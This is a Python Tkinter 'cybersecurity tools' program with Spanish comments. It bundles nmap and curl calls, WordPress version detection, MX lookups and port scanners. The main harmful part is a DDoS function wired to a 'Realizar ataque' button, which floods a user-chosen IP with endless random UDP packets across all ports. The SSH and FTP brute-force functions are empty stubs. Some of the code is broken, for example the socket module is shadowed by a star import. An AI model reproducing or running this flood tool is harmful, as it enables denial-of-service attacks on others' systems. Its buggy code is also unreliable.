"""import socket

t_host = str(input("Enter the host to be scanned: "))  # Target Host, www.example.com
t_ip = socket.gethostbyname(t_host)  # Resolve t_host to IPv4 address

print(t_ip)  # Print the IP address"""


"""
while 1:
    #t_port = int(input("Enter the port: "))  # Enter the port to be scanned
    for t_port in range(255):
        try:
            sock = socket.socket()
            res = sock.connect((t_ip, t_port))
            print("Port {}: Open".format(t_port))
            sock.close()
        except:
            print("Port {}: Closed".format(t_port))

"""

import subprocess
from datetime import time
from random import random
import threading
import socket
from _socket import setdefaulttimeout, gethostbyname
import tkinter as tk
from tkinter import messagebox
import requests
from bs4 import BeautifulSoup
import dns.resolver
from socket import *
import optparse

import os
import time

import scapy.all as scapy
import random

def ejecutar_nmap(ip):
    try:
        resultado = subprocess.check_output(["nmap", ip], stderr=subprocess.STDOUT, text=True)
        mostrar_resultado("Información del escaneo nmap:", resultado)

    except subprocess.CalledProcessError as e:
        mostrar_error(f"Error al ejecutar nmap: {e.output}")

def ejecutar_curl(url):
    try:
        resultado = subprocess.check_output(["curl", "-I", url], stderr=subprocess.STDOUT, text=True)
        mostrar_resultado("Información de la solicitud HTTP:", resultado)

    except subprocess.CalledProcessError as e:
        mostrar_error(f"Error al ejecutar curl: {e.output}")

def traducir_ip_a_url(ip):
    try:
        url = socket.gethostbyaddr(ip)[0]
        mostrar_resultado("URL traducida:", url)

    except socket.herror as e:
        mostrar_error(f"No se pudo traducir la IP a URL: {e}")

def obtener_version_wordpress(url):
    try:
        respuesta = requests.get(url)
        soup = BeautifulSoup(respuesta.text, 'html.parser')
        version = soup.find('meta', {'name': 'generator'})

        if version:
            mostrar_resultado("Versión de WordPress:", version['content'])
        else:
            mostrar_resultado("No se pudo obtener la versión de WordPress.", "")

    except requests.RequestException as e:
        mostrar_error(f"Error al obtener la versión de WordPress: {e}")

def obtener_info_correo(dominio):
    """try:
        registros_mx = [str(mx.exchange) for mx in sorted(socket.getmxrr(dominio), key=lambda x: x.preference)]
        mostrar_resultado("Información del servidor de correo (MX):", "\n".join(registros_mx))

    except socket.gaierror as e:
        mostrar_error(f"No se pudo obtener información del servidor de correo (MX): {e}")"""

    try:
        registros_mx = [str(mx.exchange) for mx in
                        sorted(dns.resolver.query(dominio, 'MX'), key=lambda x: x.preference)]
        mostrar_resultado("Información del servidor de correo (MX):", "\n".join(registros_mx))

    except dns.resolver.NXDOMAIN:
        mostrar_error(f"El dominio {dominio} no existe.")
    except dns.resolver.NoAnswer:
        mostrar_error(f"No se encontraron registros MX para el dominio {dominio}.")
    except dns.resolver.NoNameservers:
        mostrar_error(f"No se encontraron servidores de nombres para el dominio {dominio}.")
    except Exception as e:
        mostrar_error(f"Error al obtener información del servidor de correo (MX): {e}")

def DDoS(ip, port):
    # 1.- Fecha y hora
    mydate = time.strftime('%Y-%m-%d')
    mytime = time.strftime('%H-%M')

    # 2.- Socket y bytes para el ataque
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    port = int(port)
    # Let's Play ------------------------------------------------------------------------------------
    print(f"Comenzando ataque a la dirección {ip} en el puerto {port}...")

    time.sleep(2)  # tiempo entre ejecuciones
    sent = 0

    while True:
        sock.sendto(bytes, (ip, port))  # se crea la comunicación enviando X bytes a la ip que sea en el puerto que hayamos dicho
        sent = sent + 1
        port = port + 1

        print(f"Paquete {sent} enviado a {ip} a través del puerto {port}.")
        if (port == 65534):
            port = 1

    os.system("cls")
    input("Presiona INTRO para salir...")

def TCP_connect(ip, port_number, delay, output):
    TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPsock.settimeout(delay)
    try:
        TCPsock.connect((ip, port_number))
        output[port_number] = 'Listening'
    except:
        output[port_number] = ''



def scan_ports(host_ip, delay):

    threads = []        # To run TCP_connect concurrently
    output = {}         # For printing purposes

    # Spawning threads to scan ports
    for i in range(10000):
        t = threading.Thread(target=TCP_connect, args=(host_ip, i, delay, output))
        threads.append(t)

    # Starting threads
    for i in range(10000):
        threads[i].start()

    # Locking the main thread until all threads complete
    for i in range(10000):
        threads[i].join()

    # Printing listening ports from small to large
    for i in range(10000):
        if output[i] == 'Listening':
            print(str(i) + ': ' + output[i])



def mostrar_resultado(titulo, mensaje):
    messagebox.showinfo(titulo, mensaje)

def mostrar_error(mensaje):
    messagebox.showerror("Error", mensaje)



def FuerzaBrutaSSH(ip ,puerto):
    print ("SSH >> atacando al host" + ip)
def FuerzaBrutaFTP(ip ,puerto):
    print ("FTP >> atacando al host" + ip)

def ScanPort(ip):
    t_host = str(input("Enter the host to be scanned: "))  # Target Host, www.example.com
    t_ip = socket.gethostbyname(t_host)  # Resolve t_host to IPv4 address

    print("Ip: ",t_ip)  # Print the IP address

    while 1:
        t_port = int(input("Enter the port: "))  # Enter the port to be scanned

        try:
            sock = socket.socket()
            res = sock.connect((t_ip, t_port))
            print("Port {}: Open".format(t_port))
            sock.close()
        except:
            print
            "Port {}: Closed".format(t_port)

    print("Port Scanning complete")


def crear_ventana():
    ventana = tk.Tk()
    ventana.title("Herramientas de Ciberseguridad")

    etiqueta_ip = tk.Label(ventana, text="Introduce una dirección IP:")
    etiqueta_ip.pack(pady=5)

    entry_ip = tk.Entry(ventana, width=40)
    entry_ip.pack(pady=5)

    btn_nmap = tk.Button(ventana, text="Escanear con nmap", command=lambda: ejecutar_nmap(entry_ip.get()))
    btn_nmap.pack(pady=5)

    btn_curl = tk.Button(ventana, text="Solicitud HTTP con curl", command=lambda: ejecutar_curl(entry_ip.get()))
    btn_curl.pack(pady=5)

    btn_traducir = tk.Button(ventana, text="Traducir IP a URL", command=lambda: traducir_ip_a_url(entry_ip.get()))
    btn_traducir.pack(pady=5)

    btn_wordpress = tk.Button(ventana, text="Obtener versión de WordPress", command=lambda: obtener_version_wordpress(entry_ip.get()))
    btn_wordpress.pack(pady=5)

    etiqueta_correo = tk.Label(ventana, text="Introduce un dominio para obtener información del servidor de correo (MX):")
    etiqueta_correo.pack(pady=5)

    entry_correo = tk.Entry(ventana, width=40)
    entry_correo.pack(pady=5)

    btn_correo = tk.Button(ventana, text="Información del servidor de correo (MX)", command=lambda: obtener_info_correo(entry_correo.get()))
    btn_correo.pack(pady=5)

    etiqueta_DDoS = tk.Label(ventana,
                               text="Introduce un dominio y un puerto para obtener realizar un ataque DDoS:")
    etiqueta_DDoS.pack(pady=5)

    entry_IpDDoS = tk.Entry(ventana, width=40)
    entry_IpDDoS.pack(pady=5)

    entry_puertoDDoS = tk.Entry(ventana, width=40)
    entry_puertoDDoS.pack(pady=5)

    btn_DDoS = tk.Button(ventana, text="Realizar ataque",
                           command=lambda: DDoS( entry_IpDDoS.get(), entry_puertoDDoS.get() )
                           )
    btn_DDoS.pack(pady=5)

    # etiqueta_delay = tk.Label(ventana, text="Introduce el delay para el escaneo del puerto:")
    # etiqueta_delay.pack(pady=5)

    entry_delay = tk.Entry(ventana, width=40)
    entry_delay.pack(pady=5)

    btn_puerto = tk.Button(ventana, text="Escanear puertos",
                           command=lambda: ScanPort(entry_ip.get()))
    btn_puerto.pack(pady=5)

    ventana.mainloop()

if __name__ == "__main__":
    crear_ventana()
